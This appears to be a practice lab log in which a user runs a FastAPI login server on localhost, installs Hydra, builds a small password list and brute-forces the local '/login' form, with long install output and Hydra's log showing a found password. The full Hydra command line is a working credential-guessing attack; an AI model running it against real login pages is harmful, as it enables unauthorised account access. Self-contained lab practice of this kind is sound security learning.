## Brute-force attacks

### first window
```bash
darina@MacBook-Pro ~ % mkdir brute-force-server
darina@MacBook-Pro ~ % cd brute-force-server
darina@MacBook-Pro brute-force-server % python3 -m venv venv
darina@MacBook-Pro brute-force-server % source venv/bin/activate
(venv) darina@MacBook-Pro brute-force-server % pip install "fastapi[standard]"
```
<details>
Collecting fastapi[standard]
Downloading fastapi-0.142.4-py3-none-any.whl.metadata (26 kB)
Collecting starlette>=0.46.0 (from fastapi[standard])
Downloading starlette-1.7.0-py3-none-any.whl.metadata (6.6 kB)
Collecting pydantic>=2.9.0 (from fastapi[standard])
Downloading pydantic-2.13.5-py3-none-any.whl.metadata (110 kB)
Collecting typing-extensions>=4.8.0 (from fastapi[standard])
Downloading typing_extensions-4.16.0-py3-none-any.whl.metadata (3.3 kB)
Collecting typing-inspection>=0.4.2 (from fastapi[standard])
Downloading typing_inspection-0.4.4-py3-none-any.whl.metadata (2.6 kB)
Collecting annotated-doc>=0.0.2 (from fastapi[standard])
Downloading annotated_doc-0.0.5-py3-none-any.whl.metadata (6.5 kB)
Collecting opentelemetry-api>=1.44.0 (from fastapi[standard])
Downloading opentelemetry_api-1.45.1-py3-none-any.whl.metadata (1.4 kB)
Collecting opentelemetry-sdk>=1.44.0 (from fastapi[standard])
Downloading opentelemetry_sdk-1.45.1-py3-none-any.whl.metadata (1.6 kB)
Collecting opentelemetry-exporter-otlp-proto-http>=1.44.0 (from fastapi[standard])
Downloading opentelemetry_exporter_otlp_proto_http-1.45.1-py3-none-any.whl.metadata (3.0 kB)
Collecting fastapi-cli>=0.0.32 (from fastapi-cli[standard]>=0.0.32; extra == "standard"->fastapi[standard])
Downloading fastapi_cli-0.0.32-py3-none-any.whl.metadata (6.7 kB)
Collecting fastar>=0.9.0 (from fastapi[standard])
Downloading fastar-0.12.0-cp313-cp313-macosx_11_0_arm64.whl.metadata (4.1 kB)
Collecting httpx<1.0.0,>=0.23.0 (from fastapi[standard])
Downloading httpx-0.28.1-py3-none-any.whl.metadata (7.1 kB)
Collecting jinja2>=3.1.5 (from fastapi[standard])
Downloading jinja2-3.1.6-py3-none-any.whl.metadata (2.9 kB)
Collecting python-multipart>=0.0.18 (from fastapi[standard])
Downloading python_multipart-0.0.32-py3-none-any.whl.metadata (2.1 kB)
Collecting email-validator>=2.0.0 (from fastapi[standard])
Downloading email_validator-2.3.0-py3-none-any.whl.metadata (26 kB)
Collecting uvicorn>=0.12.0 (from uvicorn[standard]>=0.12.0; extra == "standard"->fastapi[standard])
Downloading uvicorn-0.54.0-py3-none-any.whl.metadata (6.6 kB)
Collecting pydantic-settings>=2.0.0 (from fastapi[standard])
Downloading pydantic_settings-2.15.0-py3-none-any.whl.metadata (3.9 kB)
Collecting pydantic-extra-types>=2.0.0 (from fastapi[standard])
Downloading pydantic_extra_types-2.11.1-py3-none-any.whl.metadata (4.2 kB)
Collecting dnspython>=2.0.0 (from email-validator>=2.0.0->fastapi[standard])
Downloading dnspython-2.8.0-py3-none-any.whl.metadata (5.7 kB)
Collecting idna>=2.0.0 (from email-validator>=2.0.0->fastapi[standard])
Downloading idna-3.20-py3-none-any.whl.metadata (7.2 kB)
Collecting typer>=0.16.0 (from fastapi-cli>=0.0.32->fastapi-cli[standard]>=0.0.32; extra == "standard"->fastapi[standard])
Downloading typer-0.27.3-py3-none-any.whl.metadata (16 kB)
Collecting rich-toolkit>=0.14.8 (from fastapi-cli>=0.0.32->fastapi-cli[standard]>=0.0.32; extra == "standard"->fastapi[standard])
Downloading rich_toolkit-0.20.5-py3-none-any.whl.metadata (3.0 kB)
Collecting fastapi-cloud-cli>=0.1.1 (from fastapi-cli[standard]>=0.0.32; extra == "standard"->fastapi[standard])
Downloading fastapi_cloud_cli-0.26.0-py3-none-any.whl.metadata (3.1 kB)
Collecting anyio (from httpx<1.0.0,>=0.23.0->fastapi[standard])
Downloading anyio-4.15.1-py3-none-any.whl.metadata (4.7 kB)
Collecting certifi (from httpx<1.0.0,>=0.23.0->fastapi[standard])
Downloading certifi-2026.7.22-py3-none-any.whl.metadata (2.5 kB)
Collecting httpcore==1.* (from httpx<1.0.0,>=0.23.0->fastapi[standard])
Downloading httpcore-1.0.9-py3-none-any.whl.metadata (21 kB)
Collecting h11>=0.16 (from httpcore==1.*->httpx<1.0.0,>=0.23.0->fastapi[standard])
Downloading h11-0.16.0-py3-none-any.whl.metadata (8.3 kB)
Collecting MarkupSafe>=2.0 (from jinja2>=3.1.5->fastapi[standard])
Downloading markupsafe-3.0.4-cp313-cp313-macosx_11_0_arm64.whl.metadata (2.7 kB)
Collecting googleapis-common-protos~=1.52 (from opentelemetry-exporter-otlp-proto-http>=1.44.0->fastapi[standard])
Downloading googleapis_common_protos-1.75.5-py3-none-any.whl.metadata (8.5 kB)
Collecting opentelemetry-exporter-http-transport==0.66b1 (from opentelemetry-exporter-http-transport[requests]==0.66b1->opentelemetry-exporter-otlp-proto-http>=1.44.0->fastapi[standard])
Downloading opentelemetry_exporter_http_transport-0.66b1-py3-none-any.whl.metadata (2.3 kB)
Collecting opentelemetry-exporter-otlp-common==0.66b1 (from opentelemetry-exporter-otlp-proto-http>=1.44.0->fastapi[standard])
Downloading opentelemetry_exporter_otlp_common-0.66b1-py3-none-any.whl.metadata (1.9 kB)
Collecting opentelemetry-exporter-otlp-proto-common==1.45.1 (from opentelemetry-exporter-otlp-proto-http>=1.44.0->fastapi[standard])
Downloading opentelemetry_exporter_otlp_proto_common-1.45.1-py3-none-any.whl.metadata (1.8 kB)
Collecting opentelemetry-proto==1.45.1 (from opentelemetry-exporter-otlp-proto-http>=1.44.0->fastapi[standard])
Downloading opentelemetry_proto-1.45.1-py3-none-any.whl.metadata (2.3 kB)
Collecting requests~=2.7 (from opentelemetry-exporter-otlp-proto-http>=1.44.0->fastapi[standard])
Downloading requests-2.34.2-py3-none-any.whl.metadata (4.8 kB)
Collecting protobuf<8.0,>=5.0 (from opentelemetry-proto==1.45.1->opentelemetry-exporter-otlp-proto-http>=1.44.0->fastapi[standard])
Downloading protobuf-7.36.2-cp310-abi3-macosx_10_9_universal2.whl.metadata (595 bytes)
Collecting opentelemetry-semantic-conventions==0.66b1 (from opentelemetry-sdk>=1.44.0->fastapi[standard])
Downloading opentelemetry_semantic_conventions-0.66b1-py3-none-any.whl.metadata (2.4 kB)
Collecting annotated-types>=0.6.0 (from pydantic>=2.9.0->fastapi[standard])
Downloading annotated_types-0.8.0-py3-none-any.whl.metadata (15 kB)
Collecting pydantic-core==2.46.5 (from pydantic>=2.9.0->fastapi[standard])
Downloading pydantic_core-2.46.5-cp313-cp313-macosx_11_0_arm64.whl.metadata (6.6 kB)
Collecting python-dotenv>=0.21.0 (from pydantic-settings>=2.0.0->fastapi[standard])
Downloading python_dotenv-1.2.4-py3-none-any.whl.metadata (29 kB)
Collecting click>=7.0 (from uvicorn>=0.12.0->uvicorn[standard]>=0.12.0; extra == "standard"->fastapi[standard])
Downloading click-8.5.0-py3-none-any.whl.metadata (2.6 kB)
Collecting httptools>=0.8.0 (from uvicorn[standard]>=0.12.0; extra == "standard"->fastapi[standard])
Downloading httptools-0.8.0-cp313-cp313-macosx_11_0_arm64.whl.metadata (3.5 kB)
Collecting pyyaml>=5.1 (from uvicorn[standard]>=0.12.0; extra == "standard"->fastapi[standard])
Downloading pyyaml-6.0.3-cp313-cp313-macosx_11_0_arm64.whl.metadata (2.4 kB)
Collecting uvloop>=0.15.1 (from uvicorn[standard]>=0.12.0; extra == "standard"->fastapi[standard])
Downloading uvloop-0.23.0-cp313-cp313-macosx_10_13_universal2.whl.metadata (5.1 kB)
Collecting watchfiles>=0.20 (from uvicorn[standard]>=0.12.0; extra == "standard"->fastapi[standard])
Downloading watchfiles-1.3.0-cp310-abi3-macosx_11_0_arm64.whl.metadata (4.9 kB)
Collecting websockets>=13.0 (from uvicorn[standard]>=0.12.0; extra == "standard"->fastapi[standard])
Downloading websockets-17.2-cp313-cp313-macosx_11_0_arm64.whl.metadata (6.3 kB)
Collecting rignore>=0.5.1 (from fastapi-cloud-cli>=0.1.1->fastapi-cli[standard]>=0.0.32; extra == "standard"->fastapi[standard])
Downloading rignore-0.8.1-cp313-cp313-macosx_11_0_arm64.whl.metadata (4.2 kB)
Collecting sentry-sdk>=2.20.0 (from fastapi-cloud-cli>=0.1.1->fastapi-cli[standard]>=0.0.32; extra == "standard"->fastapi[standard])
Downloading sentry_sdk-2.71.0-py3-none-any.whl.metadata (11 kB)
Collecting detect-installer>=0.1.0 (from fastapi-cloud-cli>=0.1.1->fastapi-cli[standard]>=0.0.32; extra == "standard"->fastapi[standard])
Downloading detect_installer-0.2.1-py3-none-any.whl.metadata (1.2 kB)
Collecting agent-detector>=1.1.0 (from fastapi-cloud-cli>=0.1.1->fastapi-cli[standard]>=0.0.32; extra == "standard"->fastapi[standard])
Downloading agent_detector-2.0.0-py3-none-any.whl.metadata (6.6 kB)
Collecting charset_normalizer<4,>=2 (from requests~=2.7->opentelemetry-exporter-otlp-proto-http>=1.44.0->fastapi[standard])
Downloading charset_normalizer-3.5.2-cp313-cp313-macosx_10_13_universal2.whl.metadata (46 kB)
Collecting urllib3<3,>=1.26 (from requests~=2.7->opentelemetry-exporter-otlp-proto-http>=1.44.0->fastapi[standard])
Downloading urllib3-2.8.0-py3-none-any.whl.metadata (7.4 kB)
Collecting rich>=13.7.1 (from rich-toolkit>=0.14.8->fastapi-cli>=0.0.32->fastapi-cli[standard]>=0.0.32; extra == "standard"->fastapi[standard])
Downloading rich-15.0.0-py3-none-any.whl.metadata (18 kB)
Collecting shellingham>=1.3.0 (from typer>=0.16.0->fastapi-cli>=0.0.32->fastapi-cli[standard]>=0.0.32; extra == "standard"->fastapi[standard])
Downloading shellingham-1.5.4-py2.py3-none-any.whl.metadata (3.5 kB)
Collecting markdown-it-py>=2.2.0 (from rich>=13.7.1->rich-toolkit>=0.14.8->fastapi-cli>=0.0.32->fastapi-cli[standard]>=0.0.32; extra == "standard"->fastapi[standard])
Downloading markdown_it_py-4.2.0-py3-none-any.whl.metadata (7.4 kB)
Collecting pygments<3.0.0,>=2.13.0 (from rich>=13.7.1->rich-toolkit>=0.14.8->fastapi-cli>=0.0.32->fastapi-cli[standard]>=0.0.32; extra == "standard"->fastapi[standard])
Downloading pygments-2.21.0-py3-none-any.whl.metadata (2.5 kB)
Collecting mdurl~=0.1 (from markdown-it-py>=2.2.0->rich>=13.7.1->rich-toolkit>=0.14.8->fastapi-cli>=0.0.32->fastapi-cli[standard]>=0.0.32; extra == "standard"->fastapi[standard])
Downloading mdurl-0.1.2-py3-none-any.whl.metadata (1.6 kB)
Downloading annotated_doc-0.0.5-py3-none-any.whl (5.3 kB)
Downloading email_validator-2.3.0-py3-none-any.whl (35 kB)
Downloading fastapi_cli-0.0.32-py3-none-any.whl (14 kB)
Downloading fastar-0.12.0-cp313-cp313-macosx_11_0_arm64.whl (623 kB)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 623.9/623.9 kB 388.6 kB/s eta 0:00:00
Downloading httpx-0.28.1-py3-none-any.whl (73 kB)
Downloading httpcore-1.0.9-py3-none-any.whl (78 kB)
Downloading jinja2-3.1.6-py3-none-any.whl (134 kB)
Downloading opentelemetry_api-1.45.1-py3-none-any.whl (60 kB)
Downloading opentelemetry_exporter_otlp_proto_http-1.45.1-py3-none-any.whl (22 kB)
Downloading opentelemetry_exporter_http_transport-0.66b1-py3-none-any.whl (12 kB)
Downloading opentelemetry_exporter_otlp_common-0.66b1-py3-none-any.whl (12 kB)
Downloading opentelemetry_exporter_otlp_proto_common-1.45.1-py3-none-any.whl (15 kB)
Downloading opentelemetry_proto-1.45.1-py3-none-any.whl (72 kB)
Downloading opentelemetry_sdk-1.45.1-py3-none-any.whl (140 kB)
Downloading opentelemetry_semantic_conventions-0.66b1-py3-none-any.whl (206 kB)
Downloading pydantic-2.13.5-py3-none-any.whl (472 kB)
Downloading pydantic_core-2.46.5-cp313-cp313-macosx_11_0_arm64.whl (1.9 MB)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.9/1.9 MB 196.7 kB/s eta 0:00:00
Downloading pydantic_extra_types-2.11.1-py3-none-any.whl (79 kB)
Downloading pydantic_settings-2.15.0-py3-none-any.whl (69 kB)
Downloading python_multipart-0.0.32-py3-none-any.whl (30 kB)
Downloading starlette-1.7.0-py3-none-any.whl (78 kB)
Downloading typing_extensions-4.16.0-py3-none-any.whl (45 kB)
Downloading typing_inspection-0.4.4-py3-none-any.whl (14 kB)
Downloading uvicorn-0.54.0-py3-none-any.whl (87 kB)
Downloading fastapi-0.142.4-py3-none-any.whl (144 kB)
Downloading annotated_types-0.8.0-py3-none-any.whl (13 kB)
Downloading anyio-4.15.1-py3-none-any.whl (132 kB)
Downloading click-8.5.0-py3-none-any.whl (125 kB)
Downloading dnspython-2.8.0-py3-none-any.whl (331 kB)
Downloading fastapi_cloud_cli-0.26.0-py3-none-any.whl (108 kB)
Downloading googleapis_common_protos-1.75.5-py3-none-any.whl (307 kB)
Downloading h11-0.16.0-py3-none-any.whl (37 kB)
Downloading httptools-0.8.0-cp313-cp313-macosx_11_0_arm64.whl (111 kB)
Downloading idna-3.20-py3-none-any.whl (69 kB)
Downloading markupsafe-3.0.4-cp313-cp313-macosx_11_0_arm64.whl (12 kB)
Downloading python_dotenv-1.2.4-py3-none-any.whl (23 kB)
Downloading pyyaml-6.0.3-cp313-cp313-macosx_11_0_arm64.whl (173 kB)
Downloading requests-2.34.2-py3-none-any.whl (73 kB)
Downloading certifi-2026.7.22-py3-none-any.whl (136 kB)
Downloading rich_toolkit-0.20.5-py3-none-any.whl (39 kB)
Downloading typer-0.27.3-py3-none-any.whl (123 kB)
Downloading uvloop-0.23.0-cp313-cp313-macosx_10_13_universal2.whl (1.4 MB)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.4/1.4 MB 917.8 kB/s eta 0:00:00
Downloading watchfiles-1.3.0-cp310-abi3-macosx_11_0_arm64.whl (397 kB)
Downloading websockets-17.2-cp313-cp313-macosx_11_0_arm64.whl (215 kB)
Downloading agent_detector-2.0.0-py3-none-any.whl (9.4 kB)
Downloading charset_normalizer-3.5.2-cp313-cp313-macosx_10_13_universal2.whl (366 kB)
Downloading detect_installer-0.2.1-py3-none-any.whl (5.4 kB)
Downloading protobuf-7.36.2-cp310-abi3-macosx_10_9_universal2.whl (456 kB)
Downloading rich-15.0.0-py3-none-any.whl (310 kB)
Downloading rignore-0.8.1-cp313-cp313-macosx_11_0_arm64.whl (815 kB)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 815.6/815.6 kB 787.5 kB/s eta 0:00:00
Downloading sentry_sdk-2.71.0-py3-none-any.whl (534 kB)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 534.3/534.3 kB 698.4 kB/s eta 0:00:00
Downloading shellingham-1.5.4-py2.py3-none-any.whl (9.8 kB)
Downloading urllib3-2.8.0-py3-none-any.whl (135 kB)
Downloading markdown_it_py-4.2.0-py3-none-any.whl (91 kB)
Downloading pygments-2.21.0-py3-none-any.whl (1.3 MB)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.3/1.3 MB 857.1 kB/s eta 0:00:00
Downloading mdurl-0.1.2-py3-none-any.whl (10.0 kB)
Installing collected packages: websockets, uvloop, urllib3, typing-extensions, shellingham, rignore, pyyaml, python-multipart, python-dotenv, pygments, protobuf, mdurl, MarkupSafe, idna, httptools, h11, fastar, dnspython, detect-installer, click, charset_normalizer, certifi, annotated-types, annotated-doc, agent-detector, uvicorn, typing-inspection, sentry-sdk, requests, pydantic-core, opentelemetry-proto, opentelemetry-api, markdown-it-py, jinja2, httpcore, googleapis-common-protos, email-validator, anyio, watchfiles, starlette, rich, pydantic, opentelemetry-semantic-conventions, opentelemetry-exporter-otlp-proto-common, opentelemetry-exporter-http-transport, httpx, typer, rich-toolkit, pydantic-settings, pydantic-extra-types, opentelemetry-sdk, fastapi, opentelemetry-exporter-otlp-common, fastapi-cloud-cli, fastapi-cli, opentelemetry-exporter-otlp-proto-http
Successfully installed MarkupSafe-3.0.4 agent-detector-2.0.0 annotated-doc-0.0.5 annotated-types-0.8.0 anyio-4.15.1 certifi-2026.7.22 charset_normalizer-3.5.2 click-8.5.0 detect-installer-0.2.1 dnspython-2.8.0 email-validator-2.3.0 fastapi-0.142.4 fastapi-cli-0.0.32 fastapi-cloud-cli-0.26.0 fastar-0.12.0 googleapis-common-protos-1.75.5 h11-0.16.0 httpcore-1.0.9 httptools-0.8.0 httpx-0.28.1 idna-3.20 jinja2-3.1.6 markdown-it-py-4.2.0 mdurl-0.1.2 opentelemetry-api-1.45.1 opentelemetry-exporter-http-transport-0.66b1 opentelemetry-exporter-otlp-common-0.66b1 opentelemetry-exporter-otlp-proto-common-1.45.1 opentelemetry-exporter-otlp-proto-http-1.45.1 opentelemetry-proto-1.45.1 opentelemetry-sdk-1.45.1 opentelemetry-semantic-conventions-0.66b1 protobuf-7.36.2 pydantic-2.13.5 pydantic-core-2.46.5 pydantic-extra-types-2.11.1 pydantic-settings-2.15.0 pygments-2.21.0 python-dotenv-1.2.4 python-multipart-0.0.32 pyyaml-6.0.3 requests-2.34.2 rich-15.0.0 rich-toolkit-0.20.5 rignore-0.8.1 sentry-sdk-2.71.0 shellingham-1.5.4 starlette-1.7.0 typer-0.27.3 typing-extensions-4.16.0 typing-inspection-0.4.4 urllib3-2.8.0 uvicorn-0.54.0 uvloop-0.23.0 watchfiles-1.3.0 websockets-17.2

[notice] A new release of pip is available: 24.3.1 -> 26.2.1
[notice] To update, run: pip install --upgrade pip
</details>

```bash
(venv) darina@MacBook-Pro brute-force-server % nano main.py
(venv) darina@MacBook-Pro brute-force-server % fastapi dev main.py

⚡️ Starting FastAPI in development mode

🐍 Using import string: main:app

🌐 Server started at http://127.0.0.1:8000
Documentation at http://127.0.0.1:8000/docs
```

```bash
Logs:

▕  Will watch for changes in these directories:
['/Users/darina/brute-force-server']
▕  Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit)
▕  Started reloader process [85460] using WatchFiles
▕  Started server process [85467]
▕  Waiting for application startup.
▕  Application startup complete.
▕  127.0.0.1:53583 - "GET /login HTTP/1.0" 405
▕  127.0.0.1:53582 - "GET /login HTTP/1.0" 405
▕  127.0.0.1:53584 - "GET /login HTTP/1.0" 405
▕  127.0.0.1:53585 - "GET /login HTTP/1.0" 405
▕  127.0.0.1:53587 - "GET /login HTTP/1.0" 405
▕  127.0.0.1:53586 - "GET /login HTTP/1.0" 405
▕  127.0.0.1:53588 - "POST /login HTTP/1.0" 200
▕  127.0.0.1:53590 - "POST /login HTTP/1.0" 200
▕  127.0.0.1:53589 - "POST /login HTTP/1.0" 200
▕  127.0.0.1:53591 - "POST /login HTTP/1.0" 200
▕  127.0.0.1:53592 - "POST /login HTTP/1.0" 200
▕  127.0.0.1:53593 - "POST /login HTTP/1.0" 200
```

### second window

```bash
darina@MacBook-Pro ~ % brew install hydra
```

<details>
==> Auto-updating Homebrew...
Adjust how often this is run with `$HOMEBREW_AUTO_UPDATE_SECS` or disable with
`$HOMEBREW_NO_AUTO_UPDATE=1`. Hide these hints with `$HOMEBREW_NO_ENV_HINTS=1` (see `man brew`).
error: could not apply 289699f... update version to https://github.com/macos-fuse-t/fuse-t/releases/tag/1.0.49
Could not apply 289699f... # update version to https://github.com/macos-fuse-t/fuse-t/releases/tag/1.0.49
To restore the stashed changes to /opt/homebrew/Library/Taps/macos-fuse-t/homebrew-cask, run:
cd /opt/homebrew/Library/Taps/macos-fuse-t/homebrew-cask && git stash pop
==> Auto-updated Homebrew!
Updated 3 taps (macos-fuse-t/cask, homebrew/core and homebrew/cask).
==> New Formulae
ddns-updater: Lightweight universal DDNS Updater program
macos-fuse-t/cask/sshfs-fuse-t
typdiff: Diff tool that generates Typst documents highlighting differences between inputs
==> New Casks
auto-tune-central: Software download manager for Antares products
azure-cli: Microsoft Azure CLI 2.0
buildin: Collaborative workspace for notes, documents and wikis
fl-studio: Digital audio production application
fluxer: Chat for friends, groups, and communities with text, voice, and video
scorpi
mcplinker: Manage and sync MCP server configurations across AI clients
nodeterm: Node-based terminal manager for terminals and coding agents on a canvas
photocraft: Image editor
solidtime: Open-source time tracker
stashcat: Secure messenger for organisations
threat-dragon: Threat modeling tool
zed-delta: Multiplayer environment for coding with agents

You have 107 outdated formulae and 3 outdated casks installed.

Warning: The following taps are not trusted:
gcenx/wine
macos-fuse-t/cask
sikarugir-app/sikarugir

Homebrew is currently ignoring formulae, casks and commands
from these taps because tap trust is required.
Prefer trusting only the specific formulae, casks or commands you need.
Trust installed casks from these taps with:
brew trust --cask macos-fuse-t/cask/fuse-t-sshfs
Trust other specific formulae and commands with:
brew trust --formula <user>/<tap>/<formula>
brew trust --command <user>/<tap>/<command>
Whole-tap trust is broader and includes all current and future formulae,
casks and commands from the listed taps. Trust whole taps with:
brew trust gcenx/wine macos-fuse-t/cask sikarugir-app/sikarugir
Untap them with:
brew untap gcenx/wine macos-fuse-t/cask sikarugir-app/sikarugir
For more information, see:
https://docs.brew.sh/Tap-Trust
==> Downloading bottle manifests
✔︎ Bottle Manifest hydra (9.7)                       Downloaded  117.6KB/117.6KB
==> Would install 1 formula:
hydra 9.7
==> Would install 1 dependency for hydra:
mariadb-connector-c
==> Would upgrade 1 dependency for hydra:
libssh
==> Do you want to proceed with the installation? [y/n]
Invalid input. Please press 'y' to proceed, or 'n' to abort.
==> Fetching downloads for: hydra
✔︎ Bottle Manifest libssh (0.12.2)                   Downloaded   34.2KB/ 34.2KB
✔︎ Bottle Manifest mariadb-connector-c (3.4.11)      Downloaded   83.5KB/ 83.5KB
✔︎ Bottle hydra (9.7)                                Downloaded  607.8KB/607.8KB
✔︎ Bottle mariadb-connector-c (3.4.11)               Downloaded  465.4KB/465.4KB
✔︎ Bottle libssh (0.12.2)                            Downloaded  615.3KB/615.3KB
==> Installing dependencies for hydra: libssh ↑ and mariadb-connector-c
==> Upgrading hydra dependency: libssh
==> Pouring libssh--0.12.2.arm64_tahoe.bottle.tar.gz
🍺  /opt/homebrew/Cellar/libssh/0.12.2: 25 files, 1.7MB
==> Installing hydra dependency: mariadb-connector-c
==> Pouring mariadb-connector-c--3.4.11.arm64_tahoe.bottle.tar.gz
🍺  /opt/homebrew/Cellar/mariadb-connector-c/3.4.11: 164 files, 1.5MB
==> Installing hydra
==> Pouring hydra--9.7.arm64_tahoe.bottle.tar.gz
🍺  /opt/homebrew/Cellar/hydra/9.7: 17 files, 1.8MB
</details>

```bash
darina@MacBook-Pro ~ % echo "admin" > usernames.txt
darina@MacBook-Pro ~ % echo "password1 password123 12345 12345admin qwerty admin" > passwords.txt
darina@MacBook-Pro ~ % cat usernames.txt
cat passwords.txt
admin
password1 password123 12345 12345admin qwerty admin
darina@MacBook-Pro ~ % nano passwords.txt
darina@MacBook-Pro ~ % cat passwords.txt
password1
password123
12345
12345admin
qwerty
admin
darina@MacBook-Pro ~ % hydra -f -I -V -L usernames.txt -P passwords.txt -s 8000 localhost http-form-post "/login:username=^USER^&password=^PASS^:F=Invalid"
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-08 11:34:17
[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:1/p:6), ~1 try per task
[DATA] attacking http-post-form://localhost:8000/login:username=^USER^&password=^PASS^:F=Invalid
[ATTEMPT] target localhost - login "admin" - pass "password1" - 1 of 6 [child 0] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "password123" - 2 of 6 [child 1] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "12345" - 3 of 6 [child 2] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "12345admin" - 4 of 6 [child 3] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "qwerty" - 5 of 6 [child 4] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "admin" - 6 of 6 [child 5] (0/0)
[8000][http-post-form] host: localhost   login: admin   password: 12345admin
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-08 11:34:17
```


